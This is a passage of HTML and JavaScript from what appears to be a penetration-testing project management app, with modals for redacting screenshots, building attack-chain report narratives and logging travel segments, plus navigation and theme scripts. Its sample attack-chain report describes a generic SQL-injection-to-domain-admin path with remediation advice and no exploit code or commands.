                            <option value="system"> System</option>
                            <option value="mobile"> Mobile</option>
                            <option value="other"> Other</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label style="display: flex; align-items: center; gap: 0.5rem;">
                            <input type="checkbox" id="autoDetectSensitive">
                            Auto-detect and flag sensitive information
                        </label>
                    </div>
                </div>
                
                <div class="modal-footer">
                    <button type="button" class="modal-btn btn-primary" onclick="uploadScreenshot()">Upload</button>
                    <button type="button" class="modal-btn btn-secondary" onclick="closeModal('uploadScreenshotModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Screenshot Editor Modal -->
    <div class="modal-overlay" id="screenshotEditorModal" style="background: rgba(0, 0, 0, 0.95);">
        <div class="modal-content" style="max-width: 95vw; width: 1400px; height: 90vh; display: flex; flex-direction: column;">
            <div class="modal-header" style="padding: 0.75rem 1rem; border-bottom: 1px solid var(--border);">
                <h3 style="display: flex; align-items: center; gap: 0.5rem;">
                    <span></span> Screenshot Editor - <span id="editorScreenshotId">SCR-001</span>
                </h3>
                <div style="display: flex; gap: 0.5rem;">
                    <button class="action-btn secondary" onclick="saveScreenshotEdits()"> Save</button>
                    <button class="action-btn secondary" onclick="exportEditedScreenshot()"> Export</button>
                    <button class="modal-close" onclick="closeModal('screenshotEditorModal')"></button>
                </div>
            </div>
            
            <div style="display: flex; flex: 1; overflow: hidden;">
                <!-- Toolbar -->
                <div style="width: 60px; background: var(--bg-secondary); border-right: 1px solid var(--border); padding: 0.5rem; display: flex; flex-direction: column; gap: 0.5rem;">
                    <button class="editor-tool" onclick="selectTool('select')" title="Select" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border); background: var(--button-primary); color: white;"></button>
                    <button class="editor-tool" onclick="selectTool('highlight')" title="Highlight" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border);"></button>
                    <button class="editor-tool" onclick="selectTool('arrow')" title="Arrow" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border);"></button>
                    <button class="editor-tool" onclick="selectTool('text')" title="Text" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border);">T</button>
                    <button class="editor-tool" onclick="selectTool('number')" title="Number Label" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border);"></button>
                    <button class="editor-tool" onclick="selectTool('blur')" title="Blur" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border);"></button>
                    <button class="editor-tool" onclick="selectTool('blackout')" title="Blackout" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border);"></button>
                    <button class="editor-tool" onclick="selectTool('pixelate')" title="Pixelate" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border);"></button>
                    <div style="border-top: 1px solid var(--border); margin: 0.5rem 0;"></div>
                    <button class="editor-tool" onclick="autoDetectSensitive()" title="Auto-detect Sensitive Info" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border); background: var(--warning); color: white;"></button>
                    <button class="editor-tool" onclick="undoEdit()" title="Undo" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border);"></button>
                    <button class="editor-tool" onclick="redoEdit()" title="Redo" style="padding: 0.5rem; border-radius: 4px; border: 1px solid var(--border);"></button>
                </div>
                
                <!-- Canvas Area -->
                <div style="flex: 1; background: #2a2a2a; position: relative; overflow: auto; display: flex; align-items: center; justify-content: center;">
                    <div style="position: absolute; top: 1rem; left: 1rem; z-index: 10; display: flex; gap: 0.5rem;">
                        <button class="filter-btn" onclick="toggleGrid()" style="background: var(--bg-secondary);"> Grid</button>
                        <button class="filter-btn" onclick="toggleSnapping()" style="background: var(--button-primary); color: white;"> Snap</button>
                        <button class="filter-btn" onclick="toggleGuides()" style="background: var(--button-primary); color: white;"> Guides</button>
                    </div>
                    
                    <div style="position: absolute; top: 1rem; right: 1rem; z-index: 10; display: flex; gap: 0.5rem; align-items: center;">
                        <select class="form-select" style="width: 100px;" onchange="setZoom(this.value)">
                            <option value="50">50%</option>
                            <option value="75">75%</option>
                            <option value="100" selected>100%</option>
                            <option value="150">150%</option>
                            <option value="200">200%</option>
                        </select>
                    </div>
                    
                    <canvas id="screenshotCanvas" style="border: 1px solid var(--border); background: white; box-shadow: 0 0 20px rgba(0,0,0,0.5);"></canvas>
                </div>
                
                <!-- Layers Panel -->
                <div style="width: 250px; background: var(--bg-secondary); border-left: 1px solid var(--border); display: flex; flex-direction: column;">
                    <!-- Properties Panel -->
                    <div style="padding: 1rem; border-bottom: 1px solid var(--border);">
                        <h4 style="margin-bottom: 0.75rem;">Properties</h4>
                        
                        <div class="form-group" style="margin-bottom: 0.75rem;">
                            <label class="form-label" style="font-size: 0.875rem;">Style Preset</label>
                            <select class="form-select" id="stylePreset" onchange="applyStylePreset(this.value)">
                                <option value="default">Default</option>
                                <option value="highlight-red">Highlight - Red</option>
                                <option value="highlight-yellow">Highlight - Yellow</option>
                                <option value="professional">Professional</option>
                                <option value="minimal">Minimal</option>
                                <option value="custom">Custom...</option>
                            </select>
                        </div>
                        
                        <div id="colorPicker" style="display: flex; gap: 0.5rem; margin-bottom: 0.75rem;">
                            <input type="color" id="strokeColor" value="#ff0000" style="width: 40px; height: 30px;" title="Stroke Color">
                            <input type="color" id="fillColor" value="#ffff00" style="width: 40px; height: 30px;" title="Fill Color">
                            <input type="range" id="strokeWidth" min="1" max="10" value="2" style="flex: 1;" title="Stroke Width">
                        </div>
                        
                        <div style="display: flex; gap: 0.5rem;">
                            <input type="range" id="opacity" min="0" max="100" value="50" style="flex: 1;" title="Opacity">
                            <span id="opacityValue" style="font-size: 0.875rem;">50%</span>
                        </div>
                    </div>
                    
                    <!-- Layers List -->
                    <div style="flex: 1; overflow-y: auto; padding: 1rem;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.75rem;">
                            <h4>Layers</h4>
                            <div style="display: flex; gap: 0.25rem;">
                                <button class="table-btn" onclick="addLayer()" title="Add Layer">+</button>
                                <button class="table-btn" onclick="groupLayers()" title="Group"></button>
                                <button class="table-btn" onclick="flattenLayers()" title="Flatten"></button>
                            </div>
                        </div>
                        
                        <div id="layersList" style="display: flex; flex-direction: column; gap: 0.5rem;">
                            <div class="layer-item" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px; border: 1px solid var(--button-primary);">
                                <button class="table-btn" onclick="toggleLayerVisibility(3)" title="Visible"></button>
                                <button class="table-btn" onclick="toggleLayerLock(3)" title="Unlocked"></button>
                                <span style="flex: 1; font-size: 0.875rem;">Number Label 1</span>
                                <button class="table-btn" onclick="moveLayerUp(3)" title="Up"></button>
                                <button class="table-btn" onclick="moveLayerDown(3)" title="Down"></button>
                            </div>
                            
                            <div class="layer-item" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;">
                                <button class="table-btn" onclick="toggleLayerVisibility(2)" title="Visible"></button>
                                <button class="table-btn" onclick="toggleLayerLock(2)" title="Unlocked"></button>
                                <span style="flex: 1; font-size: 0.875rem;">Highlight Box</span>
                                <button class="table-btn" onclick="moveLayerUp(2)" title="Up"></button>
                                <button class="table-btn" onclick="moveLayerDown(2)" title="Down"></button>
                            </div>
                            
                            <div class="layer-item" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;">
                                <button class="table-btn" onclick="toggleLayerVisibility(1)" title="Hidden" style="opacity: 0.5;"></button>
                                <button class="table-btn" onclick="toggleLayerLock(1)" title="Locked"></button>
                                <span style="flex: 1; font-size: 0.875rem; opacity: 0.5;">Blur Region</span>
                                <button class="table-btn" onclick="moveLayerUp(1)" title="Up"></button>
                                <button class="table-btn" onclick="moveLayerDown(1)" title="Down"></button>
                            </div>
                            
                            <div class="layer-item" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;">
                                <button class="table-btn" onclick="toggleLayerVisibility(0)" title="Visible"></button>
                                <button class="table-btn" onclick="toggleLayerLock(0)" title="Locked"></button>
                                <span style="flex: 1; font-size: 0.875rem;">Background</span>
                                <span style="font-size: 0.75rem; color: var(--text-secondary);">Base</span>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Actions Panel -->
                    <div style="padding: 1rem; border-top: 1px solid var(--border);">
                        <button class="action-btn secondary" style="width: 100%; margin-bottom: 0.5rem;" onclick="flattenForRelease()"> Flatten for Release</button>
                        <button class="action-btn secondary" style="width: 100%;" onclick="revertToOriginal()"> Revert to Original</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- New Attack Chain Modal -->
    <div class="modal-overlay" id="newAttackChainModal">
        <div class="modal-content" style="max-width: 900px; width: 90vw;">
            <div class="modal-header">
                <h3>Create New Attack Chain</h3>
                <button class="modal-close" onclick="closeModal('newAttackChainModal')"></button>
            </div>
            <form>
                <div class="modal-body" style="max-height: 70vh; overflow-y: auto;">
                    <div class="form-row">
                        <div class="form-group" style="flex: 2;">
                            <label class="form-label">Chain Title</label>
                            <input type="text" class="form-input" id="chainTitle" placeholder="e.g., Complete Domain Compromise" required>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Chain ID</label>
                            <input type="text" class="form-input" id="chainId" value="CHAIN-004" placeholder="Auto-generated">
                        </div>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">Testing Segment</label>
                            <select class="form-select" id="chainSegment" required>
                                <option value="">Select segment...</option>
                                <option value="external"> External Testing</option>
                                <option value="internal"> Internal Testing</option>
                                <option value="web-app"> Web Application</option>
                                <option value="infrastructure"> Infrastructure</option>
                                <option value="wireless"> Wireless Testing</option>
                                <option value="social"> Social Engineering</option>
                            </select>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Overall Severity</label>
                            <select class="form-select" id="chainSeverity">
                                <option value="low">Low</option>
                                <option value="medium">Medium</option>
                                <option value="high">High</option>
                                <option value="critical">Critical</option>
                            </select>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Chain Summary</label>
                        <textarea class="form-textarea" id="chainSummary" rows="2" placeholder="Brief description of the attack path (will appear on the card)"></textarea>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Associated Findings</label>
                        <div id="findingsSelector" style="border: 1px solid var(--border); border-radius: 6px; max-height: 200px; overflow-y: auto; padding: 0.5rem;">
                            <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 0.5rem;">
                                <label style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-secondary); border-radius: 4px; cursor: pointer;">
                                    <input type="checkbox" value="FIND-001" onchange="updateChainFindings()">
                                    <div>
                                        <div style="font-weight: 600; font-size: 0.875rem;">FIND-001</div>
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">SQL Injection</div>
                                    </div>
                                </label>
                                <label style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-secondary); border-radius: 4px; cursor: pointer;">
                                    <input type="checkbox" value="FIND-002" onchange="updateChainFindings()">
                                    <div>
                                        <div style="font-weight: 600; font-size: 0.875rem;">FIND-002</div>
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">Weak Authentication</div>
                                    </div>
                                </label>
                                <label style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-secondary); border-radius: 4px; cursor: pointer;">
                                    <input type="checkbox" value="FIND-003" onchange="updateChainFindings()">
                                    <div>
                                        <div style="font-weight: 600; font-size: 0.875rem;">FIND-003</div>
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">Privilege Escalation</div>
                                    </div>
                                </label>
                                <label style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-secondary); border-radius: 4px; cursor: pointer;">
                                    <input type="checkbox" value="FIND-007" onchange="updateChainFindings()">
                                    <div>
                                        <div style="font-weight: 600; font-size: 0.875rem;">FIND-007</div>
                                        <div style="font-size: 0.75rem; color: var(--text-secondary);">Network Misconfiguration</div>
                                    </div>
                                </label>
                            </div>
                        </div>
                        <div style="margin-top: 0.5rem; font-size: 0.875rem; color: var(--text-secondary);">
                            Selected: <span id="selectedFindingsCount">0</span> findings
                        </div>
                    </div>
                </div>
                
                <div class="modal-footer">
                    <button type="button" class="modal-btn btn-primary" onclick="createAttackChain()">Create Chain</button>
                    <button type="button" class="modal-btn btn-secondary" onclick="closeModal('newAttackChainModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Attack Chain Editor Modal -->
    <div class="modal-overlay" id="attackChainEditorModal" style="background: rgba(0, 0, 0, 0.9);">
        <div class="modal-content" style="max-width: 95vw; width: 1200px; height: 90vh; display: flex; flex-direction: column;">
            <div class="modal-header" style="padding: 0.75rem 1rem; border-bottom: 1px solid var(--border);">
                <h3 style="display: flex; align-items: center; gap: 0.5rem;">
                    <span></span> Attack Chain Editor - <span id="editorChainId">CHAIN-001</span>
                </h3>
                <div style="display: flex; gap: 0.5rem;">
                    <button class="action-btn secondary" onclick="saveChainDraft()"> Save Draft</button>
                    <button class="action-btn secondary" onclick="previewChain()"> Preview</button>
                    <button class="action-btn primary" onclick="saveChainComplete()"> Complete</button>
                    <button class="modal-close" onclick="closeModal('attackChainEditorModal')"></button>
                </div>
            </div>
            
            <div style="display: flex; flex: 1; overflow: hidden;">
                <!-- Sidebar -->
                <div style="width: 300px; background: var(--bg-secondary); border-right: 1px solid var(--border); display: flex; flex-direction: column;">
                    <!-- Chain Info -->
                    <div style="padding: 1rem; border-bottom: 1px solid var(--border);">
                        <div class="form-group" style="margin-bottom: 0.75rem;">
                            <label class="form-label" style="font-size: 0.875rem;">Chain Title</label>
                            <input type="text" class="form-input" id="editorChainTitle" value="Complete Domain Compromise">
                        </div>
                        
                        <div class="form-row">
                            <div class="form-group">
                                <label class="form-label" style="font-size: 0.875rem;">Segment</label>
                                <select class="form-select" id="editorChainSegment">
                                    <option value="external" selected>External</option>
                                    <option value="internal">Internal</option>
                                    <option value="web-app">Web App</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label class="form-label" style="font-size: 0.875rem;">Severity</label>
                                <select class="form-select" id="editorChainSeverity">
                                    <option value="critical" selected>Critical</option>
                                    <option value="high">High</option>
                                    <option value="medium">Medium</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Linked Findings -->
                    <div style="padding: 1rem; border-bottom: 1px solid var(--border);">
                        <h4 style="margin-bottom: 0.75rem;">Linked Findings</h4>
                        <div id="chainFindings" style="display: flex; flex-direction: column; gap: 0.5rem;">
                            <div class="finding-item" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px; border: 1px solid var(--button-primary);">
                                <span style="font-weight: 600; font-size: 0.875rem;">FIND-001</span>
                                <span style="flex: 1; font-size: 0.75rem;">SQL Injection</span>
                                <button class="table-btn" onclick="removeFindingFromChain('FIND-001')" title="Remove"></button>
                            </div>
                            <div class="finding-item" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;">
                                <span style="font-weight: 600; font-size: 0.875rem;">FIND-003</span>
                                <span style="flex: 1; font-size: 0.75rem;">Privilege Escalation</span>
                                <button class="table-btn" onclick="removeFindingFromChain('FIND-003')" title="Remove"></button>
                            </div>
                            <div class="finding-item" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px;">
                                <span style="font-weight: 600; font-size: 0.875rem;">FIND-007</span>
                                <span style="flex: 1; font-size: 0.75rem;">Network Config</span>
                                <button class="table-btn" onclick="removeFindingFromChain('FIND-007')" title="Remove"></button>
                            </div>
                        </div>
                        <button class="action-btn secondary" style="width: 100%; margin-top: 0.75rem;" onclick="openFindingsModal()">+ Add Finding</button>
                    </div>
                    
                    <!-- Screenshots -->
                    <div style="flex: 1; padding: 1rem; overflow-y: auto;">
                        <h4 style="margin-bottom: 0.75rem;">Available Screenshots</h4>
                        <div id="availableScreenshots" style="display: flex; flex-direction: column; gap: 0.5rem;">
                            <div class="screenshot-item" draggable="true" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px; cursor: grab;">
                                <div style="width: 30px; height: 20px; background: #f0f0f0; border-radius: 2px; display: flex; align-items: center; justify-content: center; font-size: 0.75rem;"></div>
                                <div style="flex: 1;">
                                    <div style="font-weight: 600; font-size: 0.875rem;">SCR-001</div>
                                    <div style="font-size: 0.75rem; color: var(--text-secondary);">SQL Error</div>
                                </div>
                                <button class="table-btn" onclick="insertScreenshot('SCR-001')" title="Insert">+</button>
                            </div>
                            <div class="screenshot-item" draggable="true" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem; background: var(--bg-primary); border-radius: 4px; cursor: grab;">
                                <div style="width: 30px; height: 20px; background: #f0f0f0; border-radius: 2px; display: flex; align-items: center; justify-content: center; font-size: 0.75rem;"></div>
                                <div style="flex: 1;">
                                    <div style="font-weight: 600; font-size: 0.875rem;">SCR-003</div>
                                    <div style="font-size: 0.75rem; color: var(--text-secondary);">Network Scan</div>
                                </div>
                                <button class="table-btn" onclick="insertScreenshot('SCR-003')" title="Insert">+</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Editor Area -->
                <div style="flex: 1; display: flex; flex-direction: column;">
                    <!-- Toolbar -->
                    <div style="display: flex; align-items: center; gap: 0.5rem; padding: 0.75rem; border-bottom: 1px solid var(--border); background: var(--bg-secondary);">
                        <button class="filter-btn" onclick="formatText('bold')" title="Bold"><strong>B</strong></button>
                        <button class="filter-btn" onclick="formatText('italic')" title="Italic"><em>I</em></button>
                        <button class="filter-btn" onclick="formatText('underline')" title="Underline"><u>U</u></button>
                        <div style="border-left: 1px solid var(--border); height: 20px; margin: 0 0.5rem;"></div>
                        <button class="filter-btn" onclick="insertHeading()" title="Heading">H1</button>
                        <button class="filter-btn" onclick="insertList()" title="Bullet List"> </button>
                        <button class="filter-btn" onclick="insertNumberedList()" title="Numbered List">1.</button>
                        <div style="border-left: 1px solid var(--border); height: 20px; margin: 0 0.5rem;"></div>
                        <button class="filter-btn" onclick="insertCodeBlock()" title="Code Block">&lt;/&gt;</button>
                        <button class="filter-btn" onclick="insertScreenshotPlaceholder()" title="Insert Screenshot"></button>
                        <div style="border-left: 1px solid var(--border); height: 20px; margin: 0 0.5rem;"></div>
                        <select class="form-select" style="width: 150px;" onchange="applyTemplate(this.value)">
                            <option value="">Templates...</option>
                            <option value="basic">Basic Chain</option>
                            <option value="web-app">Web Application</option>
                            <option value="network">Network Compromise</option>
                            <option value="privilege">Privilege Escalation</option>
                        </select>
                    </div>
                    
                    <!-- Editor -->
                    <div style="flex: 1; padding: 1rem; overflow-y: auto; background: white;">
                        <div contenteditable="true" id="chainNarrative" style="min-height: 100%; border: none; outline: none; font-family: 'Segoe UI', sans-serif; line-height: 1.6; font-size: 14px;">
                            <h1> Complete Domain Compromise</h1>
                            
                            <h2>Executive Summary</h2>
                            <p>Through a series of chained vulnerabilities, an external attacker can achieve complete compromise of the target domain. This attack path demonstrates how individual medium-risk findings can combine to create a critical security exposure.</p>
                            
                            <h2>Attack Chain Steps</h2>
                            
                            <h3>Step 1: Initial Access via SQL Injection</h3>
                            <p>The attack begins with exploiting a SQL injection vulnerability in the public-facing web portal (FIND-001). Using automated tools, an attacker can enumerate database contents and extract user credentials.</p>
                            
                            <div style="border: 1px dashed #ccc; padding: 1rem; margin: 1rem 0; border-radius: 4px; background: #f9f9f9; text-align: center; cursor: pointer;" onclick="selectScreenshot(this)">
                                <strong>[Screenshot: SCR-001 - SQL Injection Error Message]</strong>
                                <div style="font-size: 0.875rem; color: #666; margin-top: 0.5rem;">Click to select different screenshot</div>
                            </div>
                            
                            <h3>Step 2: Credential Harvesting and Lateral Movement</h3>
                            <p>With database access established, the attacker harvests plaintext passwords and password hashes. Weak authentication policies (FIND-002) allow for successful credential reuse across multiple systems.</p>
                            
                            <h3>Step 3: Privilege Escalation</h3>
                            <p>Using the compromised credentials, the attacker gains access to internal systems where privilege escalation vulnerabilities (FIND-003) can be exploited to achieve local administrator rights.</p>
                            
                            <h3>Step 4: Network Reconnaissance and Expansion</h3>
                            <p>From the compromised internal host, network misconfigurations (FIND-007) allow for lateral movement and discovery of domain controllers.</p>
                            
                            <div style="border: 1px dashed #ccc; padding: 1rem; margin: 1rem 0; border-radius: 4px; background: #f9f9f9; text-align: center; cursor: pointer;" onclick="selectScreenshot(this)">
                                <strong>[Screenshot: SCR-003 - Network Discovery Scan Results]</strong>
                                <div style="font-size: 0.875rem; color: #666; margin-top: 0.5rem;">Click to select different screenshot</div>
                            </div>
                            
                            <h3>Step 5: Domain Administrator Access</h3>
                            <p>Through a combination of the vulnerabilities identified above, the attacker successfully escalates privileges to domain administrator level, achieving complete control over the target environment.</p>
                            
                            <h2>Impact Assessment</h2>
                            <p>This attack chain demonstrates a complete compromise scenario with the following impacts:</p>
                            <ul>
                                <li>Complete loss of data confidentiality</li>
                                <li>Potential for data destruction or ransomware deployment</li>
                                <li>Compromise of all domain-joined systems</li>
                                <li>Ability to establish persistent backdoors</li>
                            </ul>
                            
                            <h2>Remediation Priority</h2>
                            <p>While individual findings may have lower risk ratings, the combination creates a critical exposure. Immediate remediation should focus on breaking the attack chain by addressing the initial access vector (SQL injection) and implementing proper network segmentation.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Add Journey Segment Modal -->
    <div class="modal-overlay" id="addJourneySegmentModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>Add Journey Segment</h3>
                <button class="modal-close" onclick="closeModal('addJourneySegmentModal')"></button>
            </div>
            <form>
                <div class="modal-body">
                    <div class="form-group">
                        <label class="form-label">Transport Type</label>
                        <select class="form-select" id="transportType" onchange="updateTransportFields()">
                            <option value="">Select transport type...</option>
                            <option value="train"> Train</option>
                            <option value="plane"> Plane</option>
                            <option value="tube"> Tube/Metro</option>
                            <option value="taxi"> Taxi/Uber</option>
                            <option value="car"> Car</option>
                            <option value="bus"> Bus</option>
                            <option value="walk"> Walk</option>
                        </select>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">From</label>
                            <input type="text" class="form-input" id="segmentFrom" placeholder="Starting point">
                        </div>
                        <div class="form-group">
                            <label class="form-label">To</label>
                            <input type="text" class="form-input" id="segmentTo" placeholder="Destination">
                        </div>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">Date</label>
                            <input type="date" class="form-input" id="segmentDate">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Time</label>
                            <input type="time" class="form-input" id="segmentTime">
                        </div>
                    </div>
                    
                    <div id="trainFields" style="display: none;">
                        <div class="form-row">
                            <div class="form-group">
                                <label class="form-label">Platform</label>
                                <input type="text" class="form-input" id="platform" placeholder="e.g., 13">
                            </div>
                            <div class="form-group">
                                <label class="form-label">Coach/Seat</label>
                                <input type="text" class="form-input" id="seatInfo" placeholder="e.g., Coach B, Seat 12A">
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Booking Reference</label>
                            <input type="text" class="form-input" id="bookingRef" placeholder="e.g., VT284729">
                        </div>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-group">
                            <label class="form-label">Duration</label>
                            <input type="text" class="form-input" id="duration" placeholder="e.g., 2h 10min">
                        </div>
                        <div class="form-group">
                            <label class="form-label">Cost</label>
                            <input type="text" class="form-input" id="cost" placeholder="e.g., 125.50">
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">Status</label>
                        <select class="form-select" id="segmentStatus">
                            <option value="planned">Planned</option>
                            <option value="booked">Booked</option>
                            <option value="confirmed">Confirmed</option>
                        </select>
                    </div>
                </div>
                
                <div class="modal-footer">
                    <button type="button" class="modal-btn btn-primary" onclick="saveJourneySegment()">Add Segment</button>
                    <button type="button" class="modal-btn btn-secondary" onclick="closeModal('addJourneySegmentModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <script>
        // State management
        let currentScreen = 'home';
        let currentTheme = 'light';
        let sidebarOpen = false;
        
        // Navigation
        function navigateToScreen(screenId) {
            // Hide current screen
            const current = document.getElementById(currentScreen);
            if (current) current.classList.remove('active');
            
            // Show new screen
            const newScreen = document.getElementById(screenId);
            if (newScreen) newScreen.classList.add('active');
            
            currentScreen = screenId;
            updateNavigation();
            updatePageTitle();
            
            // Close sidebar on mobile after navigation
            if (window.innerWidth < 1024) {
                closeSidebar();
            }
        }
        
        function updateNavigation() {
            // Remove active class from all nav links
            const links = document.querySelectorAll('.nav-link');
            links.forEach(link => link.classList.remove('active'));
            
            // Add active class to current link
            const activeLink = document.querySelector(`[onclick*="${currentScreen}"]`);
            if (activeLink && activeLink.classList.contains('nav-link')) {
                activeLink.classList.add('active');
            }
        }
        
        function updatePageTitle() {
            const titles = {
                'home': 'Home',
            'dashboard': 'Dashboard',
                'tasks': 'Tasks',
                'comms': 'Communications',
                'checklist': 'Pre-Engagement',
                'expenses': 'Expenses',
                'contacts': 'Contacts',
                'scope': 'Scope',
                'documents': 'Documents',
                'travel': 'Travel & Hotels',
                'methodology': 'Methodology',
                'findings': 'Findings',
                'attack-chains': 'Attack Chains',
                'assets': 'Assets',
                'credentials': 'Credentials',
                'agents': 'Agents',
                'plugins': 'Plugins',
                'ingestors': 'Ingestors',
                'reports': 'Reports',
                'screenshots': 'Screenshots',
                'history': 'Testing History',
                'settings': 'Settings'
            };
            
            const title = titles[currentScreen] || 'Dashboard';
            
            // Update page title if element exists
            const pageTitleElement = document.getElementById('pageTitle');
            if (pageTitleElement) {
                pageTitleElement.textContent = title;
            }
            
            // Update breadcrumb if element exists
            const breadcrumbElement = document.getElementById('breadcrumb');
            if (breadcrumbElement) {
                breadcrumbElement.textContent = `Project Alpha / ${title}`;
            }
        }
        
        // Sidebar toggle
        function toggleSidebar() {
            const sidebar = document.getElementById('sidebar');
            const overlay = document.getElementById('mobileOverlay');
            
            sidebarOpen = !sidebarOpen;
            
            if (sidebarOpen) {
                sidebar.classList.add('open');
                overlay.classList.add('active');
                document.body.style.overflow = 'hidden';
            } else {
                sidebar.classList.remove('open');
                overlay.classList.remove('active');
                document.body.style.overflow = '';
            }
        }
        
        function closeSidebar() {
            const sidebar = document.getElementById('sidebar');
            const overlay = document.getElementById('mobileOverlay');
            
            sidebar.classList.remove('open');
            overlay.classList.remove('active');
            document.body.style.overflow = '';
            sidebarOpen = false;
        }
        
        // Theme toggle
        function toggleTheme() {
            currentTheme = currentTheme === 'light' ? 'dark' : 'light';
            document.body.setAttribute('data-theme', currentTheme);
            
            const themeIcon = document.getElementById('themeIcon');
            const themeText = document.querySelector('.theme-text');
            
            if (currentTheme === 'light') {
                themeIcon.textContent = '';
                if (themeText) themeText.textContent = 'Dark';
            } else {
                themeIcon.textContent = '';
                if (themeText) themeText.textContent = 'Light';
            }
            
            // Save theme preference
            localStorage.setItem('theme', currentTheme);
        }
        
        // Modal functions
        function openModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.add('active');
                document.body.style.overflow = 'hidden';
                
                // Set default date and time for history entries
                if (modalId === 'addHistoryModal') {
                    const now = new Date();
                    const today = now.toISOString().split('T')[0];
                    const currentTime = now.toTimeString().substr(0,5);
                    document.getElementById('historyDate').value = today;
                    document.getElementById('historyTime').value = currentTime;
                }
                
                // Reset scope item modal title if opening normally
                if (modalId === 'addScopeItemModal' && !currentSegmentForItem) {
                    document.querySelector('#addScopeItemModal .modal-title').textContent = 'Add Scope Item';
                }
                
                // Reset segment modal title and button text
                if (modalId === 'addSegmentModal') {
                    document.querySelector('#addSegmentModal .modal-title').textContent = 'Add Test Segment';
                    document.querySelector('#addSegmentModal .btn-primary').textContent = 'Add Segment';
                }
            }
        }
        
        function closeModal(modalId) {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.classList.remove('active');
                document.body.style.overflow = '';
            }
        }
        
        function openExpenseModal() {
            // Set today's date
            const today = new Date().toISOString().split('T')[0];
            const dateInput = document.getElementById('expenseDate');
            if (dateInput) dateInput.value = today;
            
            openModal('expenseModal');
        }
        
        // Category selection
        function selectCategory(btn) {
            // Remove active from all category buttons
            const categoryBtns = document.querySelectorAll('.category-btn');
            categoryBtns.forEach(b => b.classList.remove('active'));
            
            // Add active to selected button
            btn.classList.add('active');
        }
        
        // Project functions
        function switchProject(projectId) {
            const projects = {
                'alpha': { name: 'Project Alpha', ref: '#PA-2025-001' },
                'beta': { name: 'Project Beta', ref: '#PB-2025-002' },
                'gamma': { name: 'Project Gamma', ref: '#PG-2024-015' }
            };
            
            const project = projects[projectId];
            if (project) {
                document.querySelector('.project-name').textContent = project.name;
                document.querySelector('.project-ref').textContent = project.ref;
                closeModal('switchProjectModal');
                navigateToScreen('dashboard');
            }
        }
        
        function updateProjectInfo() {
            const newName = document.getElementById('editName').value;
            const newRef = document.getElementById('editRef').value;
            
            if (newName && newRef) {
                document.querySelector('.project-name').textContent = newName;
                document.querySelector('.project-ref').textContent = '#' + newRef;
                updatePageTitle();
                alert('Project updated successfully!');
                closeModal('editProjectModal');
            }
        }
        
        // Initialize on load
        document.addEventListener('DOMContentLoaded', function() {
            // Load saved theme
            const savedTheme = localStorage.getItem('theme');
            if (savedTheme && savedTheme !== currentTheme) {
                toggleTheme();
            }
            
            // Handle window resize
            let resizeTimer;
            window.addEventListener('resize', function() {
                clearTimeout(resizeTimer);
                resizeTimer = setTimeout(function() {
                    if (window.innerWidth >= 1024) {
                        closeSidebar();
                    }
                }, 250);
            });
            
            // Close modals on escape key
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape') {
